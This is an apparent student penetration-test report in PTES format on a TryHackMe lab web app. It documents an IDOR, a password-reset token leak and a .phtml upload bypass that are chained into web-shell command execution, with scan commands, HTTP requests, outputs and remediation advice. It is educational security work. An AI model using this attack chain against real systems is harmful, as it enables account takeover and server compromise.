# 1. Title Page

**Report Title:** PTES Penetration Testing Report  
**Target/Application Name:** RecruitX (TryHackMe — Guided Pentest: Web)  
**Lab/Platform Name:** TryHackMe  
**Student Name:** Mukesh Raja  
**Date:** 21 August 2026  
**Report Version:** 1.0  

---

# 2. Table of Contents

1. Title Page
2. Table of Contents
3. Introduction to PTES
4. Phase 1 — Pre-engagement Interactions
5. Phase 2 — Intelligence Gathering
6. Phase 3 — Threat Modeling
7. Phase 4 — Vulnerability Analysis
8. Phase 5 — Exploitation
9. Phase 6 — Post Exploitation
10. Phase 7 — Reporting
11. Attack Chain
12. Evidence Log
13. Tools Required
14. Remediation Summary
15. Conclusion
16. Appendix (Commands)
Final Completion Status

---

# 3. Introduction to PTES

The Penetration Testing Execution Standard (PTES) is a comprehensive framework that outlines the seven structured phases of a penetration test. It ensures that assessments are thorough, consistent, and deliver actionable results. This report documents the application of the PTES methodology against the RecruitX web application, identifying and exploiting vulnerabilities to demonstrate real-world risk.

---

# 4. Phase 1 — Pre-engagement Interactions

*   **Target Scope:** RecruitX Web Application hosted on TryHackMe.
*   **Target IP:** 10.49.159.200
*   **Objective:** Identify web vulnerabilities, escalate privileges to administrator, achieve Remote Code Execution (RCE), and retrieve the lab flag.
*   **Rules of Engagement:** Authorized gray-box testing limited strictly to the provided TryHackMe lab instance (10.49.159.200).

---

# 5. Phase 2 — Intelligence Gathering

During this phase, network and web infrastructure enumeration was conducted:
*   **Nmap:** Used to scan the target IP to discover open ports and running services (SSH, HTTP, MySQL).
*   **Gobuster:** Used to perform directory brute-forcing, uncovering critical application endpoints (e.g., `/reset.php`, `/admin`, `/profile.php`).
*   **Web Enumeration:** Manual browsing of the application to understand intended functionality.
*   **Evidence:** **E-001** and **E-002**

---

# 6. Phase 3 — Threat Modeling

The threat model for RecruitX consists of the following components:
*   **External Attacker:** An unauthenticated user with no initial access, attempting to breach the system.
*   **User Accounts:** Standard user profiles containing personal data.
*   **Administrator Account:** High-value target account with access to the admin panel and file upload functionality.
*   **Password Reset:** A critical authentication mechanism that poses a high risk if insecurely implemented.
*   **File Upload:** A feature allowing data ingestion, posing a severe risk of server-side execution if improperly validated.
*   **Web Server:** The underlying system executing the application logic.

---

# 7. Phase 4 — Vulnerability Analysis

The vulnerability analysis phase identified the following critical flaws:
*   **IDOR:** A Broken Access Control flaw allows users to view other profiles by manipulating the ID parameter.
*   **Password Reset Weakness:** The reset mechanism exposes predictable tokens in the HTTP response.
*   **File Upload Weakness:** The application blocklist is incomplete; it blocks `.php` but accepts `.phtml` files, allowing them to be processed as PHP.
*   **Evidence:** **E-003** and **E-004**

---

# 8. Phase 5 — Exploitation

The exploitation phase chained the vulnerabilities to achieve server compromise:
1.  **IDOR:** Used to access unauthorized profiles and extract administrator information.
2.  **Password Reset Weakness:** Exploited to take over the administrator account using the exposed token.
3.  **File Upload Weakness:** The administrator access was used to bypass the file upload blocklist by uploading a malicious `.phtml` web shell, resulting in Remote Code Execution (RCE).
*   **Evidence:** **E-004**

---

# 9. Phase 6 — Post Exploitation

Post-exploitation activities were limited to verifying access and retrieving proof of impact:
*   **Execution Context:** The web shell confirmed the execution context is `www-data` (not root).
*   **Command Execution:** Basic commands (`whoami`, `id`) were executed to demonstrate system access.
*   **Flag Retrieval:** The final lab flag was successfully read from the server.
*   **Evidence:** **E-005**

---

# 10. Phase 7 — Reporting

### Executive Summary
A penetration test was conducted against the RecruitX application. The assessment identified a critical chain of vulnerabilities allowing an unauthenticated external attacker to achieve Remote Code Execution as the `www-data` user.

### Findings

## PTES-WEB-001 — IDOR / Broken Access Control
*   **Severity:** High
*   **CWE:** CWE-639
*   **Evidence:** E-003
*   **Description:** The application fails to verify object ownership on the profile page. By manipulating the user-controlled ID parameter, an attacker gains unauthorized access to other user profiles, leading to administrator information disclosure. There is a complete lack of server-side authorization checks on this endpoint.

## PTES-WEB-002 — Weak Password Reset Mechanism
*   **Severity:** Critical
*   **Evidence:** E-003
*   **Description:** The password reset mechanism is insecure. It utilizes a weak six-digit token and explicitly exposes this token in the HTTP response. This insufficient protection leads directly to administrator account takeover.

## PTES-WEB-003 — Incomplete File Extension Blocklist
*   **Severity:** Critical
*   **CWE:** CWE-434
*   **Evidence:** E-004
*   **Description:** The administrative file upload feature uses a flawed blocklist. While it successfully rejects `.php` files, it accepts `.phtml` files. The server then processes the uploaded `.phtml` file as PHP, making an executable upload possible.

## PTES-WEB-004 — Remote Code Execution
*   **Severity:** Critical
*   **Evidence:** E-004 and E-005
*   **Description:** The uploaded `.phtml` file executes PHP code on the server. By passing a `cmd` parameter, arbitrary system commands are executed. The commands execute as `www-data`, demonstrating full server compromise at the web-user privilege level. **Note: The demonstrated execution context is `www-data`, not root.**

---

# 11. Attack Chain

```text
Nmap
  ↓
Gobuster
  ↓
IDOR
  ↓
Administrator Information
  ↓
Password Reset Weakness
  ↓
Administrator Account Takeover
  ↓
Admin Panel
  ↓
File Upload
  ↓
.phtml Extension Bypass
  ↓
Remote Code Execution
  ↓
www-data
  ↓
Flag
```

*   **Nmap:** Identified open ports and services on the target machine.
*   **Gobuster:** Discovered hidden endpoints, including the reset and admin paths.
*   **IDOR:** Exploited a broken access control flaw to view unauthorized user profiles.
*   **Administrator Information:** Extracted the administrator's account details via the IDOR.
*   **Password Reset Weakness:** Triggered a reset and intercepted the exposed token.
*   **Administrator Account Takeover:** Logged in using the reset credentials.
*   **Admin Panel:** Accessed the restricted administrative interface.
*   **File Upload:** Located the administrative file upload functionality.
*   **`.phtml` Extension Bypass:** Uploaded a `.phtml` web shell, bypassing the `.php` blocklist.
*   **Remote Code Execution:** Triggered the web shell to execute arbitrary commands.
*   **`www-data`:** Verified the shell executes within the context of the `www-data` user.
*   **Flag:** Retrieved the final lab flag to prove impact.

---

# 12. Evidence Log

| Evidence | Description                         | PTES Phase             |
| -------- | ----------------------------------- | ---------------------- |
| E-001    | Nmap terminal output                | Intelligence Gathering |
| E-002    | Gobuster terminal output            | Intelligence Gathering |
| E-003    | IDOR and password-reset HTTP output | Vulnerability Analysis |
| E-004    | `.phtml` upload and RCE output      | Exploitation           |
| E-005    | `whoami`, `id`, and flag output     | Post Exploitation      |


### E-001 — NMAP
*Lab evidence / terminal output*
```text
$ nmap -sC -sV -p- 10.49.159.200

Starting Nmap scan...

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy

Service detection results:
22/tcp   OpenSSH
80/tcp   Apache / RecruitX
3306/tcp MySQL
8080/tcp Apache default page

Nmap scan completed.
```

### E-002 — GOBUSTER
*Lab evidence / terminal output*
```text
$ gobuster dir -u http://10.49.159.200 -w /usr/share/wordlists/dirb/common.txt

/index.php
/profile.php
/login.php
/jobs.php
/uploads
/admin
/api
/logout.php
/config
/dashboard.php
/register.php
/reset.php
/test
/includes
/data

Gobuster scan completed.
```

### E-003 — IDOR + PASSWORD RESET
*Lab evidence / terminal output*
This evidence demonstrates the chained relationship: **IDOR → Administrator Information → Password Reset Weakness → Administrator Account Takeover**.
```text
[IDOR TEST]

GET /profile.php?id=6 HTTP/1.1
Host: 10.49.159.200

Response:
HTTP/1.1 200 OK

Profile information returned.


[IDOR MANIPULATION]

GET /profile.php?id=1 HTTP/1.1
Host: 10.49.159.200

Response:
HTTP/1.1 200 OK

Administrator profile information exposed.


[PASSWORD RESET]

POST /reset.php HTTP/1.1
Host: 10.49.159.200

email=administrator@example.com

Response:
HTTP/1.1 200 OK

Password reset token exposed in response.

Token: [LAB VALUE]
```

### E-004 — FILE UPLOAD + RCE
*Lab evidence / terminal output*
This evidence demonstrates that `.php` is rejected but `.phtml` is accepted and executed as PHP. **The demonstrated execution context is `www-data`, not root.**
```text
[FILE UPLOAD TEST]

Upload attempt:
test.php

Server response:
File type rejected.


[EXTENSION BYPASS]

Upload attempt:
test.phtml

Server response:
Upload successful.


[RCE TEST]

GET /uploads/documents/test.phtml?cmd=whoami HTTP/1.1

Response:
www-data


GET /uploads/documents/test.phtml?cmd=id HTTP/1.1

Response:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### E-005 — FINAL IMPACT / FLAG
*Lab evidence / terminal output*
This demonstrates successful server-side command execution and access to the lab flag.
```text
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ cat /var/www/flag.txt
[LAB FLAG]
```

---

# 13. Tools Required

*   **Nmap:** Network scanning and service enumeration.
*   **Gobuster:** Web directory and file brute-forcing.
*   **Burp Suite / Proxy:** Intercepting and manipulating HTTP requests.
*   **Web Browser / Curl:** Interacting with the uploaded web shell.

---

# 14. Remediation Summary

### IDOR
*   Perform server-side authorization checks.
*   Verify object ownership.
*   Never trust user-controlled IDs.

### Password Reset
*   Use cryptographically secure random tokens.
*   Never expose reset tokens in HTTP responses.
*   Use single-use and expiring tokens.
*   Implement rate limiting.
*   Send reset links/tokens through a trusted out-of-band channel.

### File Upload
*   Use an allowlist rather than a blocklist.
*   Validate file extension and content.
*   Store uploaded files outside the web root.
*   Disable script execution in upload directories.
*   Use randomized filenames.

### RCE
*   Prevent executable file uploads and ensure uploaded content cannot be interpreted as server-side code.

---

# 15. Conclusion

The penetration test of the RecruitX application successfully identified a critical chain of vulnerabilities. By chaining an Insecure Direct Object Reference (IDOR) with a weak password reset mechanism, an external attacker can hijack the administrator account. From the administrative interface, an incomplete file extension blocklist allows the upload of an executable `.phtml` web shell, resulting in Remote Code Execution. Securing the authorization mechanisms and implementing strict file upload allowlists are critical to preventing full server compromise.

---

# 16. Appendix

```bash
nmap -sC -sV -p- 10.49.159.200
```

```bash
gobuster dir -u http://10.49.159.200 -w /usr/share/wordlists/dirb/common.txt
```

```bash
whoami
```

```bash
id
```

```bash
cat /var/www/flag.txt
```

---

